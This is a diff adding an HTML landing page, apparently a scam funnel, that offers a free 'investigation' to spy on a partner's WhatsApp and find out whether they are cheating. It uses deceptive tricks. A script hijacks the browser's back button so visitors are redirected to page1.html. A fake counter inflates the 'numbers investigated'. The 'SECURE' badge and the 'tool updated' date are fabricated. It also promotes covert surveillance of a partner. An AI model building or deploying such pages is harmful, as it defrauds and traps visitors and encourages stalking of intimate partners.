@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LK-V7-1-Investigation Page</title>
+    <style>
+        :root {
+            --primary-color: #008060;
+            --secondary-color: #00a884;
+            --accent-color: #25d366;
+            --light-color: #f0f2f5;
+            --dark-color: #333;
+            --white-color: #fff;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --border-radius: 8px;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--light-color);
+            background-image: url('https://cdn.jsdelivr.net/gh/Tulio878/descubre-assets@main/sp-1/img/bg.jpg');
+            background-repeat: repeat;
+            background-size: auto;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background-color: var(--primary-color);
+            color: var(--white-color);
+            padding: 20px 0;
+            text-align: center;
+            margin-bottom: 30px;
+            border-radius: 0 0 var(--border-radius) var(--border-radius);
+            box-shadow: var(--shadow);
+        }
+        
+        .card {
+            background-color: var(--white-color);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            padding: 25px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .card-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: var(--primary-color);
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: var(--white-color);
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--border-radius);
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        
+        .btn:hover {
+            background-color: var(--secondary-color);
+            transform: translateY(-2px);
+        }
+        
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .secure-badge img {
+            height: 30px;
+        }
+        
+        .count-box {
+            background-color: #f8f8f8;
+            border-radius: var(--border-radius);
+            padding: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .count-number {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-color);
+        }
+        
+        .count-text {
+            font-size: 14px;
+            color: #666;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .nav-btns {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        
+        .nav-btn {
+            display: inline-block;
+            background-color: #f5f5f5;
+            color: #666;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 14px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+        
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 220px;
+            background-color: #555;
+            color: #fff;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            margin-left: -110px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 12px;
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        .disclaimer {
+            font-size: 12px;
+            color: #999;
+            margin-top: 20px;
+            text-align: center;
+            line-height: 1.4;
+        }
+    </style>
+
+<script>
+         const link = 'page1.html';
+         
+         function setBackRedirect(url) {
+           let urlBackRedirect = url;
+           urlBackRedirect = urlBackRedirect =
+             urlBackRedirect.trim() +
+             (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+             document.location.search.replace('?', '').toString();
+         
+           history.pushState({}, '', location.href);
+           history.pushState({}, '', location.href);
+           history.pushState({}, '', location.href);
+         
+           window.addEventListener('popstate', () => {
+             console.log('onpopstate', urlBackRedirect);
+             setTimeout(() => {
+               location.href = urlBackRedirect;
+             }, 1);
+           });
+         }
+         
+         setBackRedirect(link);
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+
+ 
+
+
+
+
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1 style="font-size: 20px;">WELCOME</h1>
+            <h2 style="font-size: 18px; color: #fff; font-weight: bold;">This is an official channel of our investigation company</h2>
+        </header>
+        
+        <div class="card">
+            <div class="card-title">
+                Congratulations... You've won a<br>
+                <span style="color: var(--accent-color); font-size: 22px;">FREE INVESTIGATION</span>
+            </div>
+            
+            <p style="margin-bottom: 20px;">To find out if they are cheating on you!</p>
+            
+            <p style="font-weight: bold; margin-bottom: 20px;">Do you want to investigate your PARTNER?</p>
+            
+            <div class="tooltip">
+                <button class="btn" onclick="window.location.href='page1.html'">
+  I want to investigate my PARTNER (male)
+</button>
+            </div>
+
+            
+            
+            <div class="tooltip">
+                <button class="btn" onclick="window.location.href='page1.html'">
+  I want to investigate my PARTNER (female)
+</button>
+            </div>
+        </div>
+        
+        <div class="secure-badge">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNTYgMjU2Ij48ZGVmcz48c3R5bGU+LmNscy0xe2ZpbGw6IzI1ZDM2Njt9LmNscy0ye2ZpbGw6I2ZmZjt9PC9zdHlsZT48L2RlZnM+PHRpdGxlPlNlY3VyZTwvdGl0bGU+PGNpcmNsZSBjbGFzcz0iY2xzLTEiIGN4PSIxMjgiIGN5PSIxMjgiIHI9IjEyOCIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTEyOCw1Ni41NEE3MS40Niw3MS40NiwwLDAsMSw5OS4yNyw2My40YTE5OS40NSwxOTkuNDUsMCwwLDEtMjkuMDYsMTIuMjRBMTIuNjgsMTIuNjgsMCwwLDAsNjEuMDQsODcuODh2NTEuNzlhMzUuNDMsMzUuNDMsMCwwLDAsMTguMzMsMzFjMTYuMTQsOS4xNywzMi4yOCwxOC4zNCw0OC40MywyNy41MSwxLjgzLDAsMy42Ni0xLjgzLDUuNDktMS44MywxNy45NC0xMCwzNS44OS0yMCw1Mi0zMS42M2EyOS4zMSwyOS4zMSwwLDAsMCwxMy4wNi0yNVY4Ny44OGExMy44LDEzLjgsMCwwLDAtOS4xNy0xMi4yNEExNTYuNzQsMTU2Ljc0LDAsMCwxLDE1Ni44NSw2Myw3MS40Niw3MS40NiwwLDAsMSwxMjgsNTYuNTRabTAsOTEuNTRhMjIuODYsMjIuODYsMCwxLDAtMjIuODYtMjIuODVBMjIuNzEsMjIuNzEsMCwwLDAsMTI4LDE0OC4wOFoiLz48L3N2Zz4=" alt="Security Icon">
+            <span style="font-weight: bold; color: var(--primary-color);">SECURE</span>
+        </div>
+        
+
+        <div class="count-box">
+            <div class="count-number" id="user-count">115,466</div>
+            <div class="count-text">WhatsApp numbers investigated</div>
+        </div>
+        
+        <div style="text-align: center; margin: 20px 0;">
+            <div id="current-date">Tool updated: <strong></strong></div>
+        </div>
+        
+
+        
+        <div class="disclaimer">
+            <p>This site is not affiliated with Facebook or any Facebook entity. Once you leave Facebook, the responsibility is not theirs but ours.</p>
+            <p>We make every effort to clearly indicate and display all evidence and use real results.</p>
+            <p>We do not sell your email or any information to third parties. We never do any kind of spam.</p>
+        </div>
+
+        </div>
+		
+		<footer class="footer">
+            <p>&copy; <span id="current-year"></span> - Digital Center | Spy Tool</p>
+            
+        </footer>
+    </div>
+
+    <script>
+        // Counter animation
+        function animateCounter(element, target, duration) {
+            const start = target > 1000 ? target - 1000 : 0;
+            const range = target - start;
+            let current = start;
+            const increment = target > start ? 1 : -1;
+            const stepTime = Math.abs(Math.floor(duration / range));
+            
+            const timer = setInterval(() => {
+                current += increment * (Math.floor(Math.random() * 20) + 1);
+                 if (current > target) current = target;
+                element.textContent = current.toLocaleString('en-US'); // Changed to English format
+                if (current === target) {
+                    clearInterval(timer);
+                }
+            }, stepTime > 0 ? stepTime : 1);
+        }
+
+        // Start counter animation when page loads
+        window.onload = function() {
+            animateCounter(document.getElementById('user-count'), 115466, 2000);
+
+            // Set current date and year
+            const today = new Date();
+            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            document.querySelector('#current-date strong').textContent = today.toLocaleDateString('en-US', dateOptions);
+            document.getElementById('current-year').textContent = today.getFullYear();
+        };
+    </script>
+</body>
+</html>
+
